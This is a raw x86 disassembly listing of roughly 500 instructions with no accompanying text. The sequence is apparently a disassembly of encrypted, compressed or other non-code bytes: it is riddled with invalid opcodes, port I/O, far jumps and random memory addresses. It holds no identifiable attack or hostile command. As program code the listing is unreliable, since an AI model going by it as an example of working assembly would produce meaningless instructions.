  4165f9:	adc    eax,0xffc79460
  4165fe:	lods   eax,DWORD PTR ds:[esi]
  4165ff:	loop   0x4165de
  416601:	pop    esi
  416602:	xor    BYTE PTR [ebp-0x5fcaa1d],bl
  416608:	jo     0x416682
  41660a:	mov    edi,0x9b93430d
  41660f:	enter  0x8673,0x74
  416613:	fs lock shr edx,1
  416617:	shl    BYTE PTR [eax],0x36
  41661a:	rol    BYTE PTR [esi],1
  41661c:	push   0x42
  41661e:	jmp    0x4165cc
  416620:	in     al,0x83
  416622:	add    bh,dh
  416624:	pop    edx
  416625:	add    eax,edi
  416627:	fistp  DWORD PTR [edx+edi*1-0x5b398755]
  41662e:	cld    
  41662f:	call   0xe179d435
  416634:	popa   
  416635:	push   edi
  416636:	std    
  416637:	mov    al,ds:0xce3fc703
  41663c:	and    eax,0x459e86ea
  416641:	cmp    ebp,DWORD PTR [edi]
  416643:	xchg   ebp,eax
  416644:	adc    DWORD PTR [eax],eax
  416646:	xor    ebx,DWORD PTR [edi]
  416648:	shl    BYTE PTR [edi-0x2fd7bc72],0x43
  41664f:	sub    BYTE PTR [eax-0x2e],0x23
  416653:	outs   dx,BYTE PTR ds:[esi]
  416654:	mov    edi,0x3e888bd8
  416659:	(bad)  
  41665a:	js     0x416643
  41665c:	pushf  
  41665d:	push   eax
  41665e:	mov    edi,0x7c3592bb
  416663:	push   edx
  416664:	into   
  416665:	jno    0x416600
  416667:	pushf  
  416668:	pop    ecx
  416669:	cmp    bh,0x8f
  41666c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41666d:	adc    BYTE PTR [ebp+0x29765567],bl
  416673:	bound  ecx,QWORD PTR [edx+ebx*1+0x49a5f9c5]
  41667a:	fiadd  WORD PTR [edi+0x3e5ab6d8]
  416680:	jmp    0x2ca8:0x6b6381fd
  416687:	inc    ebp
  416688:	pop    ecx
  416689:	push   eax
  41668a:	mov    DWORD PTR ds:0xa4c9b1e0,edx
  416690:	and    bh,ch
  416692:	sub    DWORD PTR [edi],eax
  416694:	jg     0x4166ee
  416696:	sbb    al,0xee
  416698:	imul   DWORD PTR [ebp+0x8]
  41669b:	sbb    al,0xa9
  41669d:	clc    
  41669e:	out    0xc6,eax
  4166a0:	dec    eax
  4166a1:	into   
  4166a2:	or     al,BYTE PTR [edx+0x580d3b42]
  4166a8:	pop    edi
  4166a9:	push   DWORD PTR [ecx]
  4166ab:	lds    eax,FWORD PTR ds:0xfc8445ff
  4166b1:	mov    al,ds:0x7d0b86b4
  4166b6:	mov    ebx,0x2583fbb6
  4166bb:	scas   al,BYTE PTR es:[edi]
  4166bc:	xchg   esi,eax
  4166bd:	jle    0x41667b
  4166bf:	mov    esp,0xf54fa462
  4166c4:	pop    es
  4166c5:	fwait
  4166c6:	xor    bl,bh
  4166c8:	mov    BYTE PTR [edi+0x7efbe3d5],bl
  4166ce:	push   edi
  4166cf:	ins    DWORD PTR es:[edi],dx
  4166d0:	add    eax,DWORD PTR [ecx-0x73]
  4166d3:	xor    ecx,eax
  4166d5:	xchg   edi,eax
  4166d6:	aaa    
  4166d7:	idiv   DWORD PTR [edx]
  4166d9:	xchg   edx,eax
  4166da:	shl    BYTE PTR [edx+0x48],cl
  4166dd:	lahf   
  4166de:	and    ebp,esi
  4166e0:	(bad)  
  4166e1:	jmp    0x416663
  4166e3:	mov    ebp,0x1c8afc67
  4166e8:	outs   dx,BYTE PTR ds:[esi]
  4166e9:	adc    BYTE PTR [ebx+eax*2+0x18],al
  4166ed:	repnz inc edi
  4166ef:	std    
  4166f0:	xchg   edx,eax
  4166f1:	jno    0x416754
  4166f3:	sar    ebx,1
  4166f5:	jne    0x4166ea
  4166f7:	add    bl,BYTE PTR [esi-0x64]
  4166fa:	retf   
  4166fb:	adc    ah,ch
  4166fd:	ss leave 
  4166ff:	lea    esp,[esi*8-0x2b443a8d]
  416706:	mov    dl,0xad
  416708:	test   eax,0xad79281
  41670d:	call   0xe51ce70c
  416712:	call   0xf2724fe7
  416717:	mov    eax,0xc389b721
  41671c:	ins    BYTE PTR es:[edi],dx
  41671d:	add    esp,DWORD PTR [eax-0x5d3849af]
  416723:	jl     0x4166d9
  416725:	sub    eax,edx
  416727:	add    al,0x6f
  416729:	scas   al,BYTE PTR es:[edi]
  41672a:	rol    DWORD PTR [edx+0x41c3c5fe],0x77
  416731:	retf   
  416732:	sub    eax,0xe2930292
  416737:	je     0x4167ab
  416739:	loope  0x4166fa
  41673b:	ret    0xd2ba
  41673e:	dec    eax
  41673f:	lea    ebp,[ecx-0x1d4c1526]
  416745:	aad    0x43
  416747:	xor    al,0x2d
  416749:	push   0x36f8c88f
  41674e:	mov    edi,0x2fc32630
  416753:	mov    al,0x71
  416755:	mov    esp,0x20d855a6
  41675a:	cld    
  41675b:	mov    edx,0xd72ae2f0
  416760:	push   esp
  416761:	js     0x4166f0
  416763:	mov    ah,0x8a
  416765:	out    0x39,eax
  416767:	mov    eax,ds:0x80ca01a0
  41676c:	cmp    BYTE PTR [ebx+0x69eb18e2],bh
  416772:	das    
  416773:	or     cl,BYTE PTR [esp+ecx*8]
  416776:	mov    BYTE PTR [ebx+0x43c62a0d],0x18
  41677d:	idiv   BYTE PTR [esi-0x21797c16]
  416783:	and    DWORD PTR [edi],esp
  416785:	push   edx
  416786:	mov    fs,WORD PTR [edx]
  416788:	pop    edx
  416789:	loope  0x416739
  41678b:	push   es
  41678c:	mov    ebp,DWORD PTR [eax]
  41678e:	push   esp
  41678f:	lea    edi,[ecx]
  416791:	icebp  
  416792:	xor    eax,eax
  416794:	dec    ebp
  416795:	pop    es
  416796:	dec    edx
  416797:	hlt    
  416798:	push   0x73
  41679a:	loopne 0x41674d
  41679c:	push   edi
  41679d:	rol    BYTE PTR es:[ebp+ecx*2-0x664b5478],cl
  4167a5:	mov    esi,0x8d784d54
  4167aa:	add    DWORD PTR [ebp+0x20],eax
  4167ad:	push   ecx
  4167ae:	push   ebx
  4167af:	call   0x63e:0xfbdd9d9d
  4167b6:	jmp    0xb6b1:0xb921f2a2
  4167bd:	paddb  mm5,QWORD PTR [edx+edi*2-0xf]
  4167c2:	sbb    ecx,DWORD PTR [eax-0x5f]
  4167c5:	dec    esi
  4167c6:	aam    0xee
  4167c8:	shr    BYTE PTR [edx],cl
  4167ca:	adc    eax,0x4610d5c9
  4167cf:	xchg   dh,ah
  4167d1:	mov    dl,0x2f
  4167d3:	mov    ch,0xd3
  4167d5:	in     eax,0x64
  4167d7:	xor    al,0xb
  4167d9:	int    0xb4
  4167db:	xor    ah,BYTE PTR [ecx+0x44]
  4167de:	div    DWORD PTR [ebp-0x2f]
  4167e1:	outs   dx,DWORD PTR ds:[esi]
  4167e2:	mov    cl,0xa
  4167e4:	or     cl,bh
  4167e6:	data16 mov ch,0xee
  4167e9:	push   ds
  4167ea:	shr    esp,0xb3
  4167ed:	cmc    
  4167ee:	mov    ah,0xb4
  4167f0:	test   DWORD PTR [di],ecx
  4167f3:	push   cs
  4167f4:	pop    ss
  4167f5:	xchg   esi,eax
  4167f6:	(bad)  
  4167f7:	js     0x4167db
  4167f9:	cs inc eax
  4167fb:	and    ebp,ebx
  4167fd:	jmp    0xf82174fa
  416802:	lds    eax,FWORD PTR [edi+edi*2+0x3d11848]
  416809:	cmp    BYTE PTR [esi+0x7063c919],ah
  41680f:	mov    bl,0xf0
  416811:	scas   al,BYTE PTR es:[edi]
  416812:	mov    al,ds:0xe201337c
  416817:	dec    ebp
  416818:	imul   ebp,DWORD PTR [esi+0x372eef33],0xffffffb3
  41681f:	mov    ds:0x74723395,al
  416824:	xchg   ebx,eax
  416825:	adc    al,BYTE PTR [ebx]
  416827:	out    0xc8,al
  416829:	inc    ebp
  41682a:	dec    ecx
  41682b:	jp     0x4167bb
  41682d:	add    ebx,DWORD PTR [esi-0x55]
  416830:	mov    dh,0xb3
  416832:	es dec ebx
  416835:	jnp    0x416868
  416837:	or     eax,0x8661a882
  41683c:	or     al,0x84
  41683e:	sub    ebx,ebx
  416840:	shr    DWORD PTR [ecx],cl
  416842:	jb     0x41684b
  416844:	cmp    WORD PTR [eax],di
  416847:	popf   
  416848:	lds    ecx,FWORD PTR [ebp+0x635e6f37]
  41684e:	in     al,0x26
  416850:	loop   0x416874
  416852:	fdiv   DWORD PTR [edi+0x29]
  416855:	sti    
  416856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416857:	push   edx
  416858:	bound  esi,QWORD PTR [ebx+0x1f]
  41685b:	leave  
  41685c:	xor    ecx,DWORD PTR [ebx]
  41685e:	mov    bh,0x8b
  416860:	or     eax,0xc2f237a3
  416865:	push   eax
  416866:	ret    
  416867:	adc    BYTE PTR cs:[ebp+0x16863ce2],bl
  41686e:	jge    0x4168d5
  416870:	out    dx,al
  416871:	mov    al,ds:0x7bde836d
  416876:	mov    fs,ecx
  416878:	(bad)  
  416879:	xchg   ebp,eax
  41687a:	and    bh,ah
  41687c:	retf   
  41687d:	(bad)  
  41687e:	cs data16 loop 0x416843
  416882:	add    DWORD PTR [ebp-0x59],esi
  416885:	mov    WORD PTR cs:[esi+0x1f0db23b],cs
  41688c:	and    DWORD PTR ds:0xa8fbecee,0x21
  416893:	(bad)  
  416895:	sbb    bh,dh
  416897:	sbb    eax,DWORD PTR [edi]
  416899:	xchg   esi,eax
  41689a:	xchg   BYTE PTR [ebx],dl
  41689c:	ficom  WORD PTR [edi-0x154d552d]
  4168a2:	(bad)  
  4168a3:	or     bl,BYTE PTR [ecx-0x67d42625]
  4168a9:	icebp  
  4168aa:	aaa    
  4168ab:	test   BYTE PTR [edx],cl
  4168ad:	mov    ds:0x7b8f,eax
  4168b2:	mov    ch,0xe1
  4168b4:	fcom   QWORD PTR ds:0xacdd9200
  4168ba:	jae    0x41687a
  4168bc:	or     DWORD PTR es:[ebx-0x59],ecx
  4168c0:	pop    edx
  4168c1:	shl    BYTE PTR [esi+0x50],cl
  4168c4:	pop    ecx
  4168c5:	adc    al,0x82
  4168c7:	test   eax,0x4c65f0ba
  4168cc:	jb     0x4168e0
  4168ce:	call   0xfd9:0xb600cf7a
  4168d5:	dec    ecx
  4168d6:	fmul   QWORD PTR [edx+0x62dc62f0]
  4168dc:	dec    esp
  4168dd:	xchg   esp,esi
  4168df:	fcomp  DWORD PTR ss:[edi+eiz*8-0x5d7d2583]
  4168e7:	adc    ch,BYTE PTR [ebp+eiz*4-0x7b3bbcf]
  4168ee:	pop    ds
  4168ef:	clc    
  4168f0:	and    BYTE PTR [edi],0x4
  4168f3:	jecxz  0x4168aa
  4168f5:	in     eax,dx
  4168f6:	icebp  
  4168f7:	xor    ebx,esp
  4168f9:	(bad)  
  4168fb:	sar    esi,0xaa
  4168fe:	(bad)  
  4168ff:	hlt    
  416900:	inc    edi
  416901:	sub    DWORD PTR [edx],esp
  416903:	push   ebx
  416904:	aaa    
  416905:	xchg   ch,al
  416907:	and    al,0x7b
  416909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41690a:	and    ah,BYTE PTR [ecx-0x2d96d99a]
  416910:	sar    ah,0xf
  416913:	fldenv [eax]
  416915:	rcl    ah,1
  416917:	dec    edi
  416918:	jecxz  0x4168a1
  41691a:	inc    edi
  41691b:	xchg   ebp,eax
  41691c:	ss test al,0x31
  41691f:	dec    edx
  416920:	ds mov cl,0x20
  416923:	mov    ch,0x75
  416925:	inc    esp
  416926:	jle    0x4168c7
  416928:	sub    eax,0xb631a735
  41692d:	cmp    dl,bh
  41692f:	repz push ds
  416931:	xchg   ebp,eax
  416932:	or     eax,0xa04a3982
  416937:	test   BYTE PTR [ecx-0x5],dh
  41693a:	sbb    eax,0xa5ac0395
  41693f:	pop    esi
  416940:	mov    eax,0xd7a5d96d
  416945:	ja     0x416921
  416947:	pop    edx
  416948:	pop    ds
  416949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41694a:	mov    ah,0x86
  41694c:	cmp    ebx,DWORD PTR [eax+0x2a]
  41694f:	inc    ebx
  416950:	sub    al,0xd8
  416952:	fnstenv [ebx-0x1d]
  416955:	pavgw  mm4,QWORD PTR [ecx-0x721eb481]
  41695c:	cs jb  0x416989
  41695f:	dec    esp
  416960:	retf   
  416961:	jmp    0x416952
  416963:	popf   
  416964:	mov    DWORD PTR [ebx-0x40],edx
  416967:	les    ebx,FWORD PTR [edi-0x263a897c]
  41696d:	xchg   ebx,eax
  41696e:	test   al,0xbf
  416970:	push   0xffffffb7
  416972:	mov    esp,0xdd248a88
  416977:	pop    DWORD PTR gs:[eax-0x19]
  41697b:	xchg   edx,eax
  41697c:	pop    es
  41697d:	jmp    0x4169c6
  41697f:	push   edi
  416980:	out    0x13,eax
  416982:	mov    DWORD PTR [eax-0x1deb9c99],edi
  416988:	mov    ch,BYTE PTR [ebp-0x79]
  41698b:	dec    esi
  41698c:	loop   0x416928
  41698e:	xor    al,0xe6
  416990:	mul    DWORD PTR [ebp+0x33c49be]
  416996:	sub    dh,cl
  416998:	dec    ebx
  416999:	xchg   esi,eax
  41699a:	pop    es
  41699b:	xchg   esi,eax
  41699c:	or     al,0xd8
  41699e:	pop    ss
  41699f:	xchg   edx,eax
  4169a0:	sbb    ecx,DWORD PTR [ecx]
  4169a2:	push   eax
  4169a3:	repz sbb al,0x40
  4169a6:	xor    DWORD PTR [edx+edx*1+0x356e358f],0x429bea1d
  4169b1:	xor    DWORD PTR [esi-0x37cb6d55],0xfffffff9
  4169b8:	push   es
  4169b9:	nop
  4169ba:	lds    esp,FWORD PTR [edi]
  4169bc:	dec    edi
  4169bd:	cmp    DWORD PTR [edx],ebp
  4169bf:	jge    0x4169df
  4169c1:	(bad)  [eax+0x4d]
  4169c4:	adc    ah,cl
  4169c6:	or     DWORD PTR [edi+0x17],eax
  4169c9:	fdivr  QWORD PTR [esi+0x1b1f337b]
  4169cf:	mov    ch,0x18
  4169d1:	xchg   edx,eax
  4169d2:	and    ecx,DWORD PTR [ebx+0x27f6684b]
  4169d8:	jb     0x416a47
  4169da:	sar    DWORD PTR [ebx-0x7bc12129],1
  4169e0:	mov    edi,0x1af09a0f
  4169e5:	repz cs fcmove st,st(4)
  4169e9:	lea    edi,[edx]
  4169eb:	sbb    DWORD PTR [esi-0x2656d619],edi
  4169f1:	jb     0x416a21
  4169f3:	and    cl,ah
  4169f5:	cmp    DWORD PTR [esp+edi*1-0x2fdb9525],ecx
  4169fc:	xor    dl,BYTE PTR [eax-0x52766d7d]
  416a02:	push   ebx
  416a03:	sub    BYTE PTR [edx],ah
  416a05:	mov    WORD PTR [ebx-0x25],?
  416a08:	mov    ebp,0x6b50c6a5
  416a0d:	pop    ds
  416a0e:	scas   eax,DWORD PTR es:[edi]
  416a0f:	ins    BYTE PTR es:[edi],dx
  416a10:	pop    ds
  416a11:	outs   dx,BYTE PTR ds:[esi]
  416a12:	xor    esp,DWORD PTR [edi+esi*8-0x185a2f80]
  416a19:	mov    eax,ds:0x830cec08
  416a1e:	test   esp,eax
  416a20:	in     al,dx
  416a21:	adc    BYTE PTR [edi],al
  416a23:	lods   eax,DWORD PTR ds:[esi]
  416a24:	pop    es
  416a25:	test   eax,0x1ae80a5a
  416a2a:	stos   BYTE PTR es:[edi],al
  416a2b:	enter  0x47a0,0x75
  416a2f:	cdq    
  416a30:	retf   0xabc3
  416a33:	xor    eax,0x77f6fa2c
  416a38:	imul   eax,DWORD PTR [ecx],0x4356fd7c
  416a3e:	(bad)  
  416a3f:	out    dx,al
  416a40:	cwde   
  416a41:	dec    edi
  416a42:	(bad)  
  416a43:	loope  0x4169ef
  416a45:	adc    BYTE PTR [edx-0x7002f433],ah
  416a4b:	pop    eax
  416a4c:	sub    edx,DWORD PTR [edx+0x6]
  416a4f:	test   eax,0x64da1ccd
  416a54:	and    esp,DWORD PTR [ebx-0x36]
  416a57:	adc    DWORD PTR [ebp-0x6e],edx
  416a5a:	popa   
  416a5b:	add    DWORD PTR fs:[edx+0x5c87802d],ecx
  416a62:	fiadd  WORD PTR fs:[edi+0x58fdfe29]
  416a69:	jne    0x416a8c
  416a6b:	mov    eax,ds:0x4a2ac5a8
  416a70:	xchg   BYTE PTR [eax],bh
  416a72:	push   cs
  416a73:	jecxz  0x416a82
  416a75:	icebp  
  416a76:	fnstsw WORD PTR ds:0xeaeea03c
  416a7c:	jl     0x416a88
  416a7e:	sbb    ebx,DWORD PTR [ebx+0x6c267352]
  416a84:	hlt    
  416a85:	sbb    ecx,DWORD PTR [ecx-0x1e]
  416a88:	cmp    BYTE PTR [ecx+0x30],al
  416a8b:	fisub  WORD PTR [eax]
  416a8d:	pop    ss
  416a8e:	sub    cl,BYTE PTR [eax+edi*4]
  416a91:	pop    ds
  416a92:	(bad)  
  416a93:	out    0xae,eax
  416a95:	xchg   DWORD PTR [eax+0x5a45bbf4],ebx
  416a9b:	inc    ebx
  416a9c:	movsx  esp,WORD PTR [ebx+0x7d]
  416aa0:	jbe    0x416b0d
  416aa2:	mov    ch,0xb5
  416aa4:	push   ebx
  416aa5:	dec    esp
  416aa6:	dec    ecx
  416aa7:	pop    ebp
  416aa8:	stos   BYTE PTR es:[edi],al
  416aa9:	xchg   esi,eax
  416aaa:	add    esp,DWORD PTR [ecx-0x73499ecd]
  416ab0:	mov    dl,0x25
  416ab2:	cmp    al,0xd7
  416ab4:	div    dl
  416ab6:	lods   eax,DWORD PTR ds:[esi]
  416ab7:	push   ss
  416ab8:	retf   0x5774
  416abb:	cdq    
  416abc:	add    eax,0x9fb06a6
  416ac1:	icebp  
  416ac2:	mov    ch,BYTE PTR [ecx-0x6e]
  416ac5:	cwde   
  416ac6:	mov    esi,0x33a86b9d
  416acb:	mov    ecx,DWORD PTR [ebx-0x57e857a8]
  416ad1:	xchg   ebx,eax
  416ad2:	sub    ah,BYTE PTR [esi-0x60d65611]
  416ad8:	hlt    
  416ad9:	(bad)  
  416ada:	jl     0x416ac5
  416adc:	jae    0x416b0f
  416ade:	and    BYTE PTR [edi-0x5c0b1336],cl
  416ae4:	ins    DWORD PTR es:[edi],dx
  416ae5:	test   BYTE PTR [edi],bh
  416ae7:	test   DWORD PTR [edi-0x30de9708],esi
  416aed:	sbb    DWORD PTR [ebp-0x34668759],edx
  416af3:	push   esi
  416af4:	(bad)  
  416af5:	jnp    0x416ae4
  416af7:	shl    edx,cl
  416af9:	pop    ss
  416afa:	push   edi
  416afb:	push   0x27
  416afd:	pop    ss
  416afe:	sub    bl,BYTE PTR [edx+0x4598592c]
  416b04:	bound  edi,QWORD PTR [ebx+0x314546fc]
  416b0a:	cwde   
  416b0b:	or     al,0x28
  416b0d:	(bad)  
  416b0e:	test   al,0xa7
  416b10:	push   edx
  416b11:	push   eax
  416b12:	xor    BYTE PTR [esi-0x33],ah
  416b15:	lods   al,BYTE PTR ds:[esi]
  416b16:	dec    eax
  416b17:	xor    bl,0xd3
  416b1a:	dec    ebx
  416b1b:	test   BYTE PTR [ebx],0x3f
  416b1e:	dec    edx
  416b1f:	repz add al,0x43
  416b22:	mov    esp,0x3f867e29
  416b27:	mov    ebp,DWORD PTR [edx+0x73979d89]
  416b2d:	pop    es
  416b2e:	xchg   DWORD PTR [esi-0x1dd8758e],edi
  416b34:	push   es
  416b35:	out    dx,eax
  416b36:	push   0x2d6d3cb8
  416b3b:	das    
  416b3c:	mov    ds:0x2dbfbc1,eax
  416b41:	sti    
  416b42:	sbb    al,0xf4
  416b44:	test   al,0x1f
  416b46:	push   edx
  416b47:	xchg   ebp,eax
  416b48:	xor    al,0x3a
  416b4a:	mov    ah,0xfb
  416b4c:	les    edi,FWORD PTR [esi]
  416b4e:	xor    al,BYTE PTR [edx-0x7795cd0b]
  416b54:	and    DWORD PTR [edi+0x3b],ebp
  416b57:	push   eax
  416b58:	in     eax,0x4b
  416b5a:	sub    DWORD PTR [edi-0x272bf875],ebx
  416b60:	jecxz  0x416aee
  416b62:	sub    DWORD PTR [ebx+0x1b71d943],ecx
  416b68:	repz in al,dx
  416b6a:	jl     0x416b8f
  416b6c:	jae    0x416beb
  416b6e:	enter  0xe813,0x7f
  416b72:	rol    DWORD PTR [edx-0x406aede],0x2
  416b79:	stc    
  416b7a:	loop   0x416be7
  416b7c:	mov    WORD PTR [edi],cs
  416b7e:	jg     0x416baf
  416b80:	imul   esi,ecx,0x2d
  416b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b84:	bound  edx,QWORD PTR [eax-0x596e1fce]
  416b8a:	in     al,dx
  416b8b:	sbb    DWORD PTR [eax-0x40],ebp
  416b8e:	js     0x416b71
  416b90:	sub    al,0xa7
  416b92:	jle    0x416bb6
  416b94:	push   ds
  416b95:	cli    
  416b96:	jecxz  0x416b1a
  416b98:	cmp    BYTE PTR [esi+0x17a9f573],bl
  416b9e:	sbb    bl,dl
  416ba0:	loopne 0x416b75
  416ba2:	fwait
  416ba3:	sbb    ecx,DWORD PTR [edx-0x3e8f2775]
  416ba9:	mov    bl,0x56
  416bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bac:	call   FWORD PTR [esi]
  416bae:	ss and al,0x66
  416bb1:	jno    0x416b85
  416bb3:	or     dl,BYTE PTR [ebp+esi*1-0x28940f5b]
  416bba:	aaa    
  416bbb:	fild   DWORD PTR [esi]
  416bbd:	adc    DWORD PTR [edi+0x5ec9436c],edx
  416bc3:	dec    esp
  416bc4:	push   edx
  416bc5:	pop    edx
  416bc6:	call   0xeb52fb28
  416bcb:	sub    al,0x37
  416bcd:	lahf   
  416bce:	push   cs
  416bcf:	stc    
  416bd0:	int    0xf3
  416bd2:	(bad)  
  416bd3:	xlat   BYTE PTR ds:[ebx]
  416bd4:	dec    edi
  416bd5:	pop    ebp
  416bd6:	sub    al,0x6f
  416bd8:	fnstcw WORD PTR ds:0x84d08a2b
  416bde:	mov    ch,0x1e
  416be0:	jmp    0x416bb6
  416be2:	das    
  416be3:	sti    
  416be4:	mov    eax,0x25b3a435
  416be9:	addr16 mov ebx,0xf26718f9
  416bef:	and    al,0xdf
  416bf1:	mov    cl,0x1f
  416bf3:	jl     0x416c71
  416bf5:	into   
  416bf6:	push   ss
  416bf7:	(bad)  
  416bf8:	retf   
  416bf9:	int    0x3d
  416bfb:	mov    ds:0x5327a58b,al
  416c00:	sahf   
  416c01:	pop    edx
  416c02:	je     0x416bc0
  416c04:	sbb    eax,DWORD PTR [esi]
  416c06:	out    0xda,eax
  416c08:	nop    DWORD PTR [edx+0x1a]
  416c0c:	and    eax,0x6fbc958e
  416c11:	push   edx
  416c12:	sar    DWORD PTR [edi-0x4dd88289],0x14
  416c19:	or     al,0xbe
  416c1b:	in     al,0x5a
  416c1d:	xchg   esp,eax
  416c1e:	fidivr DWORD PTR [ebx]
  416c20:	add    ebp,DWORD PTR [ebp-0x4f5886a2]
  416c26:	clc    
  416c27:	push   ebx
  416c28:	retf   
  416c29:	out    0xaa,eax
  416c2b:	mov    esp,0xec09bf4d
  416c30:	xchg   edx,eax
  416c31:	retf   
  416c32:	xchg   edx,eax
  416c33:	push   esp
  416c34:	or     eax,0x52243faf
  416c39:	jmp    0x416bc6
  416c3b:	mov    BYTE PTR [edi-0x23],ah
  416c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c3f:	xor    DWORD PTR [edx],esi
  416c41:	aad    0x56
  416c43:	in     al,dx
  416c44:	sub    bl,BYTE PTR [eax-0x3e2e414c]
  416c4a:	stc    
  416c4b:	sbb    eax,0x12c78dbd
  416c50:	gs clc 
  416c52:	retf   
  416c53:	std    
  416c54:	jle    0x416c55
  416c56:	into   
  416c57:	pop    esi
  416c58:	jp     0x416ccb
  416c5a:	enter  0x6d98,0x8d
  416c5e:	push   ss
  416c5f:	sbb    eax,0xed5c887a
  416c64:	push   edi
  416c65:	push   es
  416c66:	mov    cl,BYTE PTR [ebp+0x2b]
  416c69:	xchg   esp,eax
  416c6a:	mov    cl,0xf8
  416c6c:	add    ebp,eax
  416c6e:	add    DWORD PTR [edx],edi
  416c70:	fdivr  QWORD PTR [edx+0x66a0ea33]
  416c76:	repnz inc ebp
  416c78:	ror    DWORD PTR [esi+edx*2],1
  416c7b:	lods   eax,DWORD PTR ds:[esi]
  416c7c:	fadd   DWORD PTR [ebp-0x3ad75f1a]
  416c82:	xor    eax,0xd91a28f5
  416c87:	neg    BYTE PTR [edi+eax*2+0xc8010f]
  416c8e:	outs   dx,BYTE PTR ds:[esi]
  416c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c90:	(bad)  
  416c91:	mov    ?,ebx
  416c93:	loopne 0x416c7a
  416c95:	jg     0x416c7e
  416c97:	mov    esi,0xaea42f16
  416c9c:	(bad)  
  416c9e:	and    bl,bl
  416ca0:	mov    ah,0xef
  416ca2:	rcl    DWORD PTR [edi-0x50],cl
  416ca5:	push   esi
  416ca6:	jle    0x416c3d
  416ca8:	ins    DWORD PTR es:[edi],dx
  416ca9:	or     DWORD PTR [eax-0x52],0xffffffa6
  416cad:	sahf   
  416cae:	rol    BYTE PTR [edx+0x25a93553],0x66
  416cb5:	push   ebp
  416cb6:	push   ds
  416cb7:	mov    ebp,0xdac0e46f
  416cbc:	out    dx,eax
  416cbd:	jmp    FWORD PTR [edx-0x69190972]
  416cc3:	cmp    bl,BYTE PTR [eax+0x168b8ff6]
  416cc9:	cmp    esp,0xffffffb5
  416ccc:	popa   
  416ccd:	ds push cs
  416ccf:	and    al,0xad
  416cd1:	jno    0x416ca2
  416cd3:	sbb    eax,0x83f21f61
  416cd8:	pop    ebx
  416cd9:	and    al,0x70
  416cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cdc:	push   edi
  416cdd:	adc    BYTE PTR [edi+0x8dcf9c4],cl
  416ce3:	xor    BYTE PTR [eax-0x355834d2],bl
  416ce9:	test   al,0x79
  416ceb:	sbb    BYTE PTR [eax-0x1646a7cd],dh
  416cf1:	lea    eax,[edx-0x71]
  416cf4:	mov    eax,DWORD PTR [edi]
  416cf6:	cmp    eax,0x2a87b03c
  416cfb:	repnz loop 0x416cf6
  416cfe:	out    dx,eax
  416cff:	mov    ebp,gs
  416d01:	adc    ecx,0x2
  416d04:	jmp    0x416d06
  416d06:	shr    edx,0x10
  416d09:	aad    0xb5
  416d0b:	arpl   WORD PTR [edx],di
  416d0d:	arpl   cx,dx
  416d0f:	or     dl,dh
  416d11:	sub    BYTE PTR [edx+0x46963752],0x53
  416d18:	mov    edx,0x2b889317
  416d1d:	or     edi,ebx
  416d1f:	sub    BYTE PTR [esi-0x2646a9d6],dl
  416d25:	popf   
  416d26:	mov    ds:0x6ebeebc6,eax
  416d2b:	std    
  416d2c:	into   
  416d2d:	cs cs popa 
  416d30:	sar    DWORD PTR [edi+0x47],1
  416d33:	xor    al,0x38
  416d35:	xchg   edx,eax
  416d36:	cmp    eax,DWORD PTR [ebx-0x2a]
  416d39:	xchg   edx,eax
  416d3a:	push   esp
  416d3b:	fsub   QWORD PTR [ecx-0x74]
  416d3e:	iret   
  416d3f:	les    ebx,FWORD PTR [eax+eiz*1]
  416d42:	fild   DWORD PTR [ebp+0x74]
  416d45:	mov    ch,0x79
  416d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d48:	dec    edx
  416d49:	pushf  
  416d4a:	and    DWORD PTR [eax],ebx
  416d4c:	stos   BYTE PTR es:[edi],al
  416d4d:	xchg   ebp,eax
  416d4e:	dec    esi
  416d4f:	xor    dh,0xe1
  416d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d53:	jb     0x416db6
  416d55:	push   ds
  416d56:	push   esp
  416d57:	push   edx
  416d58:	adc    DWORD PTR [esi-0x198d707e],ebx
  416d5e:	mov    eax,ebx
  416d60:	test   eax,0x2f783e3b
  416d65:	outs   dx,BYTE PTR ds:[esi]
  416d66:	sub    al,0xe7
  416d68:	mov    al,0xd4
  416d6a:	popf   
  416d6b:	les    eax,FWORD PTR [edx-0x47b1255]
  416d71:	sub    eax,0x3338511
  416d76:	lds    edi,FWORD PTR [edi-0x2cd8780e]
  416d7c:	push   esi
  416d7d:	inc    edi
  416d7e:	or     BYTE PTR [ebp+0x2f],al
  416d81:	pop    edi
  416d82:	and    DWORD PTR [ebx],esp
  416d84:	clc    
  416d85:	adc    ebp,ebx
  416d87:	xchg   ebp,eax
  416d88:	fs cmc 
  416d8a:	mov    dl,0x7
  416d8c:	sbb    al,0x33
  416d8e:	add    eax,0x8195b5e3
  416d93:	mov    dh,0x10
  416d95:	ja     0x416d6d
  416d97:	imul   esi,DWORD PTR [ecx+eax*8+0x23e03889],0xae538f7e
  416da2:	repz (bad) 
  416da4:	mov    eax,ds:0x87bda55f
  416da9:	jns    0x416d88
  416dab:	cmc    
  416dac:	ret    
  416dad:	or     al,bl
  416daf:	imul   esi
  416db1:	or     eax,0x4b86eb26
  416db7:	out    dx,eax
  416db8:	cdq    
  416db9:	out    dx,eax
  416dba:	jle    0x416d9d
  416dbc:	xor    BYTE PTR [eax+0x49],ah
  416dbf:	xchg   ebx,eax
  416dc0:	ficom  WORD PTR [esi]
  416dc2:	sub    ah,cl
  416dc4:	loopne 0x416dbf
  416dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dc7:	fld    DWORD PTR [edx+edx*1+0x3561d137]
  416dce:	adc    eax,0x1ff05ee4
  416dd3:	dec    esi
  416dd4:	add    BYTE PTR [ebx-0x14],ah
  416dd7:	pushf  
  416dd8:	cmp    ch,BYTE PTR [edi-0x55]
  416ddb:	cwde   
  416ddc:	sbb    ah,BYTE PTR [eax]
  416dde:	in     al,dx
  416ddf:	mov    dl,0x87
  416de1:	out    0xef,eax
  416de3:	mov    esp,0xf02a5037
  416de8:	lahf   
